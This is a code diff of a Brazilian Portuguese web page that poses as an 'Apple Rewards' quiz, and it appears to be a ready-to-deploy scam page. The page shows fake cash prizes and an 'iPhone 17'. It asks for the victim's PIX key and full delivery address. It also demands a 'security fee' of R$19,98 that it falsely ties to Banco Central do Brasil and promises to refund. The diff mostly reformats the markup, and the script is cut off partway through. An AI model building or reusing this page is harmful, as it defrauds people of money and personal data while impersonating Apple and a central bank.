@@ -1,4 +1,6 @@
-<!DOCTYPE html><html lang="pt-BR"><head>
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Apple Rewards</title>
@@ -293,675 +295,378 @@
     .taxa-header {
         text-align: center;
         padding: 40px 25px 30px;
-        background: #fff<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Apple Rewards</title>
+        background: #fff;
+    }
 
-<style>
-    body {
-        background: #f5f5f7;
-        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-        margin: 0;
-        padding: 0;
-        display: flex;
-        justify-content: center;
-        align-items: flex-start;
-        min-height: 100vh;
-    }
+    .taxa-logo-apple {
+        width: 30px;
+        margin-bottom: 20px;
+    }
+    
+    .taxa-icon-check {
+        width: 35px;
+        height: 35px;
+        margin: 0 auto 10px;
+        color: #0071e3; /* Azul Apple para o ícone de check */
+    }
 
-    .shine {
-        animation: shine 0.6s ease-out;
-    }
+    .taxa-title {
+        font-size: 26px;
+        font-weight: 700;
+        margin-bottom: 15px;
+        color: #1c1c1c;
+    }
 
-    @keyframes shine {
-        0% { text-shadow: 0 0 0px gold; }
-        50% { text-shadow: 0 0 14px gold; }
-        100% { text-shadow: 0 0 0px gold; }
-    }
+    .taxa-description {
+        font-size: 16px;
+        line-height: 1.5;
+        color: #333;
+        margin-bottom: 20px;
+    }
 
-    .container, .resgate-container, .taxa-container, .envio-container {
-        width: 95%;
-        max-width: 420px;
-        background: #ffffff;
-        margin-top: 25px;
-        border-radius: 22px;
-        padding: 25px;
-        box-shadow: 0px 8px 22px rgba(0,0,0,0.08);
-    }
-    
-    .taxa-container {
-        /* Remove o padding lateral padrão de .container para que o conteúdo possa se estender nas bordas, como na imagem de referência */
-        padding: 0px; 
-        margin-top: 0;
-        border-radius: 0;
-        box-shadow: none;
-        max-width: 500px;
-    }
-    
-    .envio-container { /* Estilos da Nova Tela */
-        margin-top: 0;
-        border-radius: 0;
-        box-shadow: none;
-        max-width: 500px;
-    }
+    .taxa-reembolso {
+        font-size: 15px;
+        color: #555;
+        margin-bottom: 30px;
+    }
 
-    /* BARRA DE PROGRESSO */
-    .progress-wrapper {
-        width: 100%;
-        height: 10px;
-        background: #d9d9d9;
-        border-radius: 20px;
-        overflow: hidden;
-        margin-bottom: 20px;
-    }
+    .taxa-item-list {
+        padding: 0 25px 25px;
+        background: #fff;
+    }
 
-    .progress-bar {
-        height: 100%;
-        width: 0%;
-        background: #0071e3;
-        transition: 0.35s;
-    }
+    .taxa-item {
+        display: flex;
+        align-items: flex-start;
+        padding: 16px;
+        background: #f5f5f7; /* Cor de fundo suave do corpo */
+        border-radius: 12px;
+        margin-bottom: 15px;
+    }
 
-    .topbar {
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        margin-bottom: 25px;
-    }
+    .taxa-item-icon {
+        width: 24px;
+        height: 24px;
+        margin-right: 15px;
+        color: #000; /* Ícones em preto */
+        flex-shrink: 0;
+    }
 
-    .logo {
-        display: flex;
-        align-items: center;
-        gap: 8px;
-        font-weight: 600;
-        font-size: 18px;
-    }
+    .taxa-item-content {
+        flex-grow: 1;
+    }
 
-    .logo img {
-        width: 26px;
-    }
+    .taxa-item-title {
+        font-size: 16px;
+        font-weight: 600;
+        color: #1c1c1c;
+        margin-bottom: 4px;
+    }
 
-    .money-box {
-        background: #f2f2f2;
-        padding: 6px 12px;
-        border-radius: 12px;
-        font-weight: 600;
-        font-size: 14px;
-        display: flex;
-        align-items: center;
-        gap: 10px;
-    }
+    .taxa-item-text {
+        font-size: 14px;
+        color: #555;
+    }
 
-    .btn-sac {
-        background: #000;
-        color: #fff;
-        padding: 6px 14px;
-        border-radius: 10px;
-        font-size: 13px;
-        font-weight: 600;
-        cursor: pointer;
-    }
+    .taxa-btn-sacar {
+        width: 100%;
+        background: #0071e3; /* Azul principal da Apple */
+        color: #fff;
+        padding: 18px;
+        border: none;
+        border-radius: 12px;
+        font-size: 18px;
+        font-weight: 700;
+        cursor: pointer;
+        margin: 0 auto 30px;
+        display: block;
+        max-width: 90%;
+    }
+    
+    /* ESTILOS DA NOVA TELA DE ENVIO */
+    .envio-header {
+        text-align: center;
+        padding-bottom: 20px;
+    }
 
-    h2 {
-        text-align: center;
-        font-size: 20px;
-        font-weight: 700;
-        color: #111;
-        margin-bottom: 10px;
-    }
+    .envio-header h2 {
+        font-size: 24px;
+        margin-bottom: 5px;
+    }
 
-    .subtitle {
-        text-align: center;
-        color: #555;
-        margin-bottom: 20px;
-        font-size: 14px;
-    }
+    .envio-header p {
+        font-size: 15px;
+        color: #666;
+    }
 
-    .option {
-        background: #fafafa;
-        padding: 14px;
-        border-radius: 14px;
-        border: 1px solid #e5e5e5;
-        display: flex;
-        align-items: center;
-        gap: 12px;
-        margin-bottom: 12px;
-        cursor: pointer;
-        transition: 0.2s;
-        font-weight: 500;
-    }
+    .envio-icon-iphone {
+        width: 70px;
+        height: 70px;
+        color: #1c1c1c;
+        margin-bottom: 15px;
+    }
 
-    .option:hover {
-        background: #eaeaea;
-    }
+    .envio-form label {
+        display: block;
+        font-size: 14px;
+        font-weight: 600;
+        color: #333;
+        margin-bottom: 6px;
+        margin-top: 15px;
+    }
 
-    button {
-        width: 100%;
-        background: #000;
-        color: #fff;
-        padding: 14px;
-        border: none;
-        border-radius: 14px;
-        font-size: 15px;
-        font-weight: 700;
-        margin-top: 18px;
-        cursor: pointer;
-        opacity: 0.7;
-    }
+    .envio-form input {
+        width: calc(100% - 24px);
+        padding: 12px;
+        border-radius: 10px;
+        border: 1px solid #ddd;
+        font-size: 16px;
+        box-sizing: border-box;
+    }
 
-    button.enabled {
-        opacity: 1;
-    }
-
-    .bonus {
-        text-align: center;
-        margin-top: 10px;
-        font-size: 13px;
-        color: #0071e3;
-    }
-
-    footer {
-        margin-top: 25px;
-        text-align: center;
-        font-size: 11px;
-        color: #777;
-    }
-
-    footer span {
-        color: #c90000;
-        font-weight: 600;
-    }
-
-    .popup {
-        position: fixed;
-        top: 0; left: 0;
-        width: 100%; height: 100%;
-        background: rgba(0,0,0,0.55);
-        display: none;
-        justify-content: center;
-        align-items: center;
-        z-index: 9999;
-    }
-
-    .popup-box {
-        background: #fff;
-        width: 90%;
-        max-width: 360px;
-        border-radius: 20px;
-        padding: 25px;
-        text-align: center;
-    }
-
-    .popup-box h3 {
-        font-size: 20px;
-        font-weight: 700;
-        margin-bottom: 10px;
-    }
-
-    .popup-valor {
-        font-size: 32px;
-        font-weight: 800;
-        color: #00c851;
-        margin-bottom: 15px;
-    }
-
-    .popup-btn {
-        background: #000;
-        color: #fff;
-        border: none;
-        width: 100%;
-        padding: 14px;
-        border-radius: 12px;
-        font-size: 14px;
-        font-weight: 700;
-        cursor: pointer;
-    }
-
-    .popup-final .popup-box {
-        background: #6a0dad;
-        color: #fff;
-    }
-
-    .popup-final .popup-btn {
-        background: #fff;
-        color: #6a0dad;
-    }
-
-    .resgate-container, .taxa-container, .envio-container { display:none; }
-
-    .resgate-title {
-        font-size:22px;
-        font-weight:700;
-        text-align:center;
-        margin-bottom:15px;
-    }
-
-    .saldo-box {
-        background:#000;
-        padding:12px;
-        border-radius:16px;
-        color:#fff;
-        font-size:18px;
-        text-align:center;
-        margin-bottom:22px;
-        font-weight:700;
-    }
-
-    .valores-box {
-        display:grid;
-        grid-template-columns:1fr 1fr;
-        gap:12px;
-        margin-bottom:25px;
-    }
-
-    .valor-btn {
-        background:#f5f5f7;
-        border:1px solid #ccc;
-        padding:14px;
-        border-radius:12px;
-        text-align:center;
-        font-size:15px;
-        font-weight:600;
-        cursor:pointer;
-        transition:0.3s;
-    }
-
-    .valor-btn:hover { background:#e7e7ea; }
-
-    select, input {
-        width:100%;
-        padding:12px;
-        border-radius:12px;
-        border:1px solid #ccc;
-        margin-bottom:18px;
-        font-size:15px;
-    }
-
-    #btnSaque {
-        background:#0071e3;
-        font-size:16px;
-        border-radius:12px;
-    }
-
-    /* ESTILOS DA TELA DE TAXA DE SEGURANÇA */
-    .taxa-header {
-        text-align: center;
-        padding: 40px 25px 30px;
-        background: #fff;
-    }
-
-    .taxa-logo-apple {
-        width: 30px;
-        margin-bottom: 20px;
-    }
-    
-    .taxa-icon-check {
-        width: 35px;
-        height: 35px;
-        margin: 0 auto 10px;
-        color: #0071e3; /* Azul Apple para o ícone de check */
-    }
-
-    .taxa-title {
-        font-size: 26px;
-        font-weight: 700;
-        margin-bottom: 15px;
-        color: #1c1c1c;
-    }
-
-    .taxa-description {
-        font-size: 16px;
-        line-height: 1.5;
-        color: #333;
-        margin-bottom: 20px;
-    }
-
-    .taxa-reembolso {
-        font-size: 15px;
-        color: #555;
-        margin-bottom: 30px;
-    }
-
-    .taxa-item-list {
-        padding: 0 25px 25px;
-        background: #fff;
-    }
-
-    .taxa-item {
-        display: flex;
-        align-items: flex-start;
-        padding: 16px;
-        background: #f5f5f7; /* Cor de fundo suave do corpo */
-        border-radius: 12px;
-        margin-bottom: 15px;
-    }
-
-    .taxa-item-icon {
-        width: 24px;
-        height: 24px;
-        margin-right: 15px;
-        color: #000; /* Ícones em preto */
-        flex-shrink: 0;
-    }
-
-    .taxa-item-content {
-        flex-grow: 1;
-    }
-
-    .taxa-item-title {
-        font-size: 16px;
-        font-weight: 600;
-        color: #1c1c1c;
-        margin-bottom: 4px;
-    }
-
-    .taxa-item-text {
-        font-size: 14px;
-        color: #555;
-    }
-
-    .taxa-btn-sacar {
-        width: 100%;
-        background: #0071e3; /* Azul principal da Apple */
-        color: #fff;
-        padding: 18px;
-        border: none;
-        border-radius: 12px;
-        font-size: 18px;
-        font-weight: 700;
-        cursor: pointer;
-        margin: 0 auto 30px;
-        display: block;
-        max-width: 90%;
-    }
-    
-    /* ESTILOS DA NOVA TELA DE ENVIO */
-    .envio-header {
-        text-align: center;
-        padding-bottom: 20px;
-    }
-
-    .envio-header h2 {
-        font-size: 24px;
-        margin-bottom: 5px;
-    }
-
-    .envio-header p {
-        font-size: 15px;
-        color: #666;
-    }
-
-    .envio-icon-iphone {
-        width: 70px;
-        height: 70px;
-        color: #1c1c1c;
-        margin-bottom: 15px;
-    }
-
-    .envio-form label {
-        display: block;
-        font-size: 14px;
-        font-weight: 600;
-        color: #333;
-        margin-bottom: 6px;
-        margin-top: 15px;
-    }
-
-    .envio-form input {
-        width: calc(100% - 24px);
-        padding: 12px;
-        border-radius: 10px;
-        border: 1px solid #ddd;
-        font-size: 16px;
-        box-sizing: border-box;
-    }
-
-    .envio-btn-finalizar {
-        background: #0071e3;
-        font-size: 17px;
-        border-radius: 12px;
-        padding: 16px;
-        margin-top: 30px;
-    }
+    .envio-btn-finalizar {
+        background: #0071e3;
+        font-size: 17px;
+        border-radius: 12px;
+        padding: 16px;
+        margin-top: 30px;
+    }
 </style>
 </head>
 
 <body>
 
 <audio id="coinSound">
-    <source src="https://assets.mixkit.co/sfx/preview/mixkit-fairy-coin-voice-1089.mp3" type="audio/mpeg">
+    <source src="https://assets.mixkit.co/sfx/preview/mixkit-fairy-coin-voice-1089.mp3" type="audio/mpeg">
 </audio>
 
 <div class="container" id="quizContainer">
 
-    <div class="topbar">
-        <div class="logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
-            Apple
-        </div>
+    <div class="topbar">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
+            Apple
+        </div>
 
-        <div class="money-box">
-            <span id="saldoTopo">R$0,00</span>
-            <div class="btn-sac">SACAR</div>
-        </div>
-    </div>
+        <div class="money-box">
+            <span id="saldoTopo">R$0,00</span>
+            <div class="btn-sac">SACAR</div>
+        </div>
+    </div>
 
-    <div class="progress-wrapper">
-        <div class="progress-bar" id="progressBar"></div>
-    </div>
+    <div class="progress-wrapper">
+        <div class="progress-bar" id="progressBar"></div>
+    </div>
 
-    <h2 id="question-title"></h2>
-    <div class="subtitle">Selecione uma opção para continuar:</div>
-    <div id="options"></div>
+    <h2 id="question-title"></h2>
+    <div class="subtitle">Selecione uma opção para continuar:</div>
+    <div id="options"></div>
 
-    <button id="continuar">Continuar</button>
+    <button id="continuar">Continuar</button>
 
-    <div class="bonus">Concorra a um bônus especial Apple</div>
+    <div class="bonus">Concorra a um bônus especial Apple</div>
 
-    <footer>
-        Ao participar das atividades de recompensa, você concorda com nossos <span>Termos e Condições</span>.
-    </footer>
+    <footer>
+        Ao participar das atividades de recompensa, você concorda com nossos <span>Termos e Condições</span>.
+    </footer>
 
 </div>
 
 <div class="resgate-container" id="resgateContainer">
 
-    <div class="topbar">
-        <div class="logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
-            Apple
-        </div>
+    <div class="topbar">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
+            Apple
+        </div>
 
-        <div class="money-box">
-            R$559,51
-        </div>
-    </div>
+        <div class="money-box">
+            R$559,51
+        </div>
+    </div>
 
-    <div class="resgate-title">Resgatar Recompensa</div>
+    <div class="resgate-title">Resgatar Recompensa</div>
 
-    <div class="saldo-box">Saldo disponível: R$559,51</div>
+    <div class="saldo-box">Saldo disponível: R$559,51</div>
 
-    <h3 style="font-size:16px;font-weight:600;">Últimas recompensas</h3>
+    <h3 style="font-size:16px;font-weight:600;">Últimas recompensas</h3>
 
-    <div class="valores-box">
-        <div class="valor-btn">R$1,50</div>
-        <div class="valor-btn">R$5,00</div>
-        <div class="valor-btn">R$10,00</div>
-        <div class="valor-btn">R$559,51</div>
-    </div>
+    <div class="valores-box">
+        <div class="valor-btn">R$1,50</div>
+        <div class="valor-btn">R$5,00</div>
+        <div class="valor-btn">R$10,00</div>
+        <div class="valor-btn">R$559,51</div>
+    </div>
 
-    <select id="tipoChave">
-        <option>Selecione o tipo de chave</option>
-        <option>Chave Aleatória</option>
-        <option>Celular</option>
-        <option>E-mail</option>
-        <option>CPF</option>
-    </select>
+    <select id="tipoChave">
+        <option>Selecione o tipo de chave</option>
+        <option>Chave Aleatória</option>
+        <option>Celular</option>
+        <option>E-mail</option>
+        <option>CPF</option>
+    </select>
 
-    <input type="text" id="chavePix" placeholder="Digite sua chave PIX">
+    <input type="text" id="chavePix" placeholder="Digite sua chave PIX">
 
-    <button id="btnSaque">REALIZAR SAQUE AGORA</button>
+    <button id="btnSaque">REALIZAR SAQUE AGORA</button>
 </div>
 
 <div class="taxa-container" id="taxaContainer">
-    <div class="taxa-header">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="taxa-logo-apple">
-        
-        <svg xmlns="http://www.w3.org/2000/svg" class="taxa-icon-check" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-            <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
-            <polyline points="22 4 12 14.01 9 11.01"></polyline>
-        </svg>
+    <div class="taxa-header">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="taxa-logo-apple">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" class="taxa-icon-check" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+            <polyline points="22 4 12 14.01 9 11.01"></polyline>
+        </svg>
 
-        <div class="taxa-title">Taxa de Segurança</div>
-        
-        <p class="taxa-description">
-            Seguindo as diretrizes do Banco Central do Brasil, solicitamos uma confirmação de identidade de **R$ 19,98** para garantir a autenticidade dos participantes.
-        </p>
-        
-        <p class="taxa-reembolso">
-            O dinheiro será totalmente reembolsado entre **1 a 5 minutos** junto ao saldo acumulado.
-        </p>
-    </div>
+        <div class="taxa-title">Taxa de Segurança</div>
+        
+        <p class="taxa-description">
+            Seguindo as diretrizes do Banco Central do Brasil, solicitamos uma confirmação de identidade de **R$ 19,98** para garantir a autenticidade dos participantes.
+        </p>
+        
+        <p class="taxa-reembolso">
+            O dinheiro será totalmente reembolsado entre **1 a 5 minutos** junto ao saldo acumulado.
+        </p>
+    </div>
 
-    <div class="taxa-item-list">
-        
-        <div class="taxa-item">
-            <svg xmlns="http://www.w3.org/2000/svg" class="taxa-item-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-                <circle cx="12" cy="12" r="10"></circle>
-                <polyline points="12 6 12 12 16 14"></polyline>
-            </svg>
-            <div class="taxa-item-content">
-                <div class="taxa-item-title">Taxa obrigatória</div>
-                <div class="taxa-item-text">Obrigatório para realizar o saque dos seus ganhos.</div>
-            </div>
-        </div>
+    <div class="taxa-item-list">
+        
+        <div class="taxa-item">
+            <svg xmlns="http://www.w3.org/2000/svg" class="taxa-item-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                <circle cx="12" cy="12" r="10"></circle>
+                <polyline points="12 6 12 12 16 14"></polyline>
+            </svg>
+            <div class="taxa-item-content">
+                <div class="taxa-item-title">Taxa obrigatória</div>
+                <div class="taxa-item-text">Obrigatório para realizar o saque dos seus ganhos.</div>
+            </div>
+        </div>
 
-        <div class="taxa-item">
-            <svg xmlns="http://www.w3.org/2000/svg" class="taxa-item-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-                <polyline points="1 4 1 10 7 10"></polyline>
-                <polyline points="23 20 23 14 17 14"></polyline>
-                <path d="M20.49 9A9 9 0 0 0 5.64 5.64L1 10m22 4l-4.64 4.36A9 9 0 0 1 3.51 15"></path>
-            </svg>
-            <div class="taxa-item-content">
-                <div class="taxa-item-title">Valor reembolsável</div>
-                <div class="taxa-item-text">Você recebe os **R$ 19,98** de volta após finalizar.</div>
-            </div>
-        </div>
-        
-        <div class="taxa-item">
-            <svg xmlns="http://www.w3.org/2000/svg" class="taxa-item-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
-                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
-            </svg>
-            <div class="taxa-item-content">
-                <div class="taxa-item-title">Garantia de segurança</div>
-                <div class="taxa-item-text">Seu pagamento é seguro e protegido por Banco Central do Brasil.</div>
-            </div>
-        </div>
-        
-        <button class="taxa-btn-sacar" id="btnTaxaSacar">REALIZAR SAQUE</button>
-    </div>
+        <div class="taxa-item">
+            <svg xmlns="http://www.w3.org/2000/svg" class="taxa-item-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                <polyline points="1 4 1 10 7 10"></polyline>
+                <polyline points="23 20 23 14 17 14"></polyline>
+                <path d="M20.49 9A9 9 0 0 0 5.64 5.64L1 10m22 4l-4.64 4.36A9 9 0 0 1 3.51 15"></path>
+            </svg>
+            <div class="taxa-item-content">
+                <div class="taxa-item-title">Valor reembolsável</div>
+                <div class="taxa-item-text">Você recebe os **R$ 19,98** de volta após finalizar.</div>
+            </div>
+        </div>
+        
+        <div class="taxa-item">
+            <svg xmlns="http://www.w3.org/2000/svg" class="taxa-item-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+            </svg>
+            <div class="taxa-item-content">
+                <div class="taxa-item-title">Garantia de segurança</div>
+                <div class="taxa-item-text">Seu pagamento é seguro e protegido por Banco Central do Brasil.</div>
+            </div>
+        </div>
+        
+        <button class="taxa-btn-sacar" id="btnTaxaSacar">REALIZAR SAQUE</button>
+    </div>
 </div>
 
 <div class="envio-container" id="envioContainer">
-    <div class="envio-header">
-        <svg xmlns="http://www.w3.org/2000/svg" class="envio-icon-iphone" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
-            <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
-            <line x1="12" y1="18" x2="12" y2="18"></line>
-        </svg>
+    <div class="envio-header">
+        <svg xmlns="http://www.w3.org/2000/svg" class="envio-icon-iphone" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
+            <line x1="12" y1="18" x2="12" y2="18"></line>
+        </svg>
 
-        <h2>🎉 Parabéns! Último Passo para o seu iPhone.</h2>
-        <p>Você confirmou sua elegibilidade. Agora, precisamos dos dados para **envio prioritário** do seu novo **iPhone 17** e a transferência do seu PIX de **R$559,51**.</p>
-        <p>Preencha com o endereço exato de entrega para que nossa logística Apple possa processar seu pedido.</p>
-    </div>
+        <h2>🎉 Parabéns! Último Passo para o seu iPhone.</h2>
+        <p>Você confirmou sua elegibilidade. Agora, precisamos dos dados para **envio prioritário** do seu novo **iPhone 17** e a transferência do seu PIX de **R$559,51**.</p>
+        <p>Preencha com o endereço exato de entrega para que nossa logística Apple possa processar seu pedido.</p>
+    </div>
 
-    <form class="envio-form">
-        <label for="nomeCompleto">Nome Completo</label>
-        <input type="text" id="nomeCompleto" placeholder="Seu nome" required>
+    <form class="envio-form">
+        <label for="nomeCompleto">Nome Completo</label>
+        <input type="text" id="nomeCompleto" placeholder="Seu nome" required>
 
-        <label for="cep">CEP</label>
-        <input type="text" id="cep" placeholder="00000-000" required>
+        <label for="cep">CEP</label>
+        <input type="text" id="cep" placeholder="00000-000" required>
 
-        <label for="endereco">Endereço (Rua/Avenida, Número)</label>
-        <input type="text" id="endereco" placeholder="Ex: Rua das Maçãs, 100" required>
+        <label for="endereco">Endereço (Rua/Avenida, Número)</label>
+        <input type="text" id="endereco" placeholder="Ex: Rua das Maçãs, 100" required>
 
-        <label for="bairro">Bairro</label>
-        <input type="text" id="bairro" placeholder="Ex: Centro" required>
+        <label for="bairro">Bairro</label>
+        <input type="text" id="bairro" placeholder="Ex: Centro" required>
 
-        <label for="cidade">Cidade</label>
-        <input type="text" id="cidade" placeholder="Ex: São Paulo" required>
+        <label for="cidade">Cidade</label>
+        <input type="text" id="cidade" placeholder="Ex: São Paulo" required>
 
-        <label for="estado">Estado (UF)</label>
-        <input type="text" id="estado" placeholder="Ex: SP" required>
+        <label for="estado">Estado (UF)</label>
+        <input type="text" id="estado" placeholder="Ex: SP" required>
 
-        <button class="envio-btn-finalizar" id="btnFinalizarEnvio" type="button">FINALIZAR ENVIO E RECEBER PIX</button>
-    </form>
+        <button class="envio-btn-finalizar" id="btnFinalizarEnvio" type="button">FINALIZAR ENVIO E RECEBER PIX</button>
+    </form>
 </div>
-
 <div class="popup" id="popup">
-    <div class="popup-box">
-        <h3>Recompensa recebida!</h3>
-        <div class="popup-valor" id="popupValor">R$0,00</div>
-        <button class="popup-btn" id="popupBtn">Continuar recebendo</button>
-    </div>
+    <div class="popup-box">
+        <h3>Recompensa recebida!</h3>
+        <div class="popup-valor" id="popupValor">R$0,00</div>
+        <button class="popup-btn" id="popupBtn">Continuar recebendo</button>
+    </div>
 </div>
 
 <div class="popup popup-final" id="popupFinal">
-    <div class="popup-box">
-        <h3>Parabéns!</h3>
-        <p style="font-size:17px;font-weight:500;margin-bottom:10px;">
-            Você completou o quiz e ganhou:
-        </p>
-        <div class="popup-valor" style="color:#00ff8c;font-size:35px;">
-            R$559,51 + um iPhone 17
-        </div>
-        <button class="popup-btn" id="finalBtn">Receber recompensa</button>
-      </div>
+    <div class="popup-box">
+        <h3>Parabéns!</h3>
+        <p style="font-size:17px;font-weight:500;margin-bottom:10px;">
+            Você completou o quiz e ganhou:
+        </p>
+        <div class="popup-valor" style="color:#00ff8c;font-size:35px;">
+            R$559,51 + um iPhone 17
+        </div>
+        <button class="popup-btn" id="finalBtn">Receber recompensa</button>
+    </div>
 </div>
+
 <div class="popup" id="popupConquista">
-    <div class="popup-box" style="max-width:400px;border-radius:25px;padding:30px;background:#fefefe;">
-        <h3 style="font-size:24px;font-weight:700;color:#1c1c1c;margin-bottom:15px;">🎉 Parabéns pela sua conquista!</h3>
-        <p style="font-size:16px;color:#333;margin-bottom:15px;line-height:1.5;">
-            Você acaba de ganhar um <strong>iPhone 17</strong> e <strong>R$850,00</strong> na sua chave PIX.
-        </p>
-        <p style="font-size:15px;color:#555;margin-bottom:20px;line-height:1.5;">
-            Nossa equipe de logística já está preparando seu iPhone, e o envio para o seu endereço será realizado em breve.
-        </p>
-        <p style="font-size:15px;color:#555;margin-bottom:25px;line-height:1.5;">
-            Para receber seu PIX, basta clicar no botão abaixo e efetuar a taxa de segurança. Isso garante que a chave PIX fornecida realmente seja sua, validando seu recebimento imediato.
-        </p>
-        <button class="popup-btn" id="btnConquista" style="background:#0071e3;color:#fff;font-size:16px;font-weight:700;padding:16px;border-radius:14px;cursor:pointer;border:none;width:100%;">
-            Receber Recompensa Agora
-        </button>
-    </div>
+    <div class="popup-box" style="max-width:400px;border-radius:25px;padding:30px;background:#fefefe;">
+        <h3 style="font-size:24px;font-weight:700;color:#1c1c1c;margin-bottom:15px;">🎉 Parabéns pela sua conquista!</h3>
+        <p style="font-size:16px;color:#333;margin-bottom:15px;line-height:1.5;">
+            Você acaba de ganhar um <strong>iPhone 17</strong> e <strong>R$850,00</strong> na sua chave PIX.
+        </p>
+        <p style="font-size:15px;color:#555;margin-bottom:20px;line-height:1.5;">
+            Nossa equipe de logística já está preparando seu iPhone, e o envio para o seu endereço será realizado em breve.
+        </p>
+        <p style="font-size:15px;color:#555;margin-bottom:25px;line-height:1.5;">
+            Para receber seu PIX, basta clicar no botão abaixo e efetuar a taxa de segurança. Isso garante que a chave PIX fornecida realmente seja sua, validando seu recebimento imediato.
+        </p>
+        <button class="popup-btn" id="btnConquista" style="background:#0071e3;color:#fff;font-size:16px;font-weight:700;padding:16px;border-radius:14px;cursor:pointer;border:none;width:100%;">
+            Receber Recompensa Agora
+        </button>
+    </div>
 </div>
-    <script>
+<script>
 const coinSound = document.getElementById("coinSound");
 
 const perguntas = [
-    {
-        titulo: "Qual produto Apple você mais utiliza?",
-        opcoes: ["📱 iPhone", "💻 MacBook", "⌚ Apple Watch", "🎧 AirPods"]
-    },
-    {
-        titulo: "Qual cor de iPhone você mais gosta?",
-        opcoes: ["⚪ Branco", "⚫ Preto", "🩶 Titan Natural", "🔵 Azul"]
-    },
-    {
-        titulo: "Como você avalia a bateria dos iPhones?",
-        opcoes: ["🔋 Excelente", "👍 Boa", "🙂 Razoável", "😕 Pode melhorar"]
-    },
-    {
-        titulo: "Você usaria um Apple Vision Pro?",
-        opcoes: ["🤩 Com certeza!", "😎 Talvez", "🤔 Não sei", "🙅‍♂️ Não usaria"]
-    },
-    {
-        titulo: "Qual serviço Apple você mais usa?",
-        opcoes: ["🎵 Apple Music", "📦 iCloud", "📺 Apple TV+", "🎮 Arcade"]
-    }
+    {
+        titulo: "Qual produto Apple você mais utiliza?",
+        opcoes: ["📱 iPhone", "💻 MacBook", "⌚ Apple Watch", "🎧 AirPods"]
+    },
+    {
+        titulo: "Qual cor de iPhone você mais gosta?",
+        opcoes: ["⚪ Branco", "⚫ Preto", "🩶 Titan Natural", "🔵 Azul"]
+    },
+    {
+        titulo: "Como você avalia a bateria dos iPhones?",
+        opcoes: ["🔋 Excelente", "👍 Boa", "🙂 Razoável", "😕 Pode melhorar"]
+    },
+    {
+        titulo: "Você usaria um Apple Vision Pro?",
+        opcoes: ["🤩 Com certeza!", "😎 Talvez", "🤔 Não sei", "🙅‍♂️ Não usaria"]
+    },
+    {
+        titulo: "Qual serviço Apple você mais usa?",
+        opcoes: ["🎵 Apple Music", "📦 iCloud", "📺 Apple TV+", "🎮 Arcade"]
+    }
 ];
 
 const valores = [38.52, 42.71, 33.18, 45.90, 399.20];
@@ -989,133 +694,130 @@ const progressBar = document.getElementById("progressBar");
 const btnSaque = document.getElementById("btnSaque");
 const resgateContainer = document.getElementById("resgateContainer");
 const taxaContainer = document.getElementById("taxaContainer");
-const envioContainer = document.getElementById("envioContainer"); // Nova Tela Adicionada
-const quizContainer = document.getElementById("quizContainer"); 
+const envioContainer = document.getElementById("envioContainer"); 
+const quizContainer = document.getElementById("quizContainer"); 
 
 const btnTaxaSacar = document.getElementById("btnTaxaSacar"); // Botão "REALIZAR SAQUE" da tela de taxa
-const btnFinalizarEnvio = document.getElementById("btnFinalizarEnvio"); // Botão da nova tela de envio
+const btnFinalizarEnvio = document.getElementById("btnFinalizarEnvio"); // Botão da tela de envio
 
-// **********************************************
 // NOVO: Variáveis para o Pop-up de Conquista
 const popupConquista = document.getElementById("popupConquista");
 const btnConquista = document.getElementById("btnConquista");
-// **********************************************
 
 
 function atualizarProgresso() {
-    const progresso = ((etapa) / perguntas.length) * 100;
-    progressBar.style.width = progresso + "%";
+    const progresso = ((etapa) / perguntas.length) * 100;
+    progressBar.style.width = progresso + "%";
 }
 
 function brilho(el) {
-    el.classList.remove("shine");
-    void el.offsetWidth;
-    el.classList.add("shine");
+    el.classList.remove("shine");
+    void el.offsetWidth;
+    el.classList.add("shine");
 }
 
 function carregarPergunta() {
-    atualizarProgresso();
+    atualizarProgresso();
 
-    const q = perguntas[etapa];
-    title.innerText = q.titulo;
-    optionsBox.innerHTML = "";
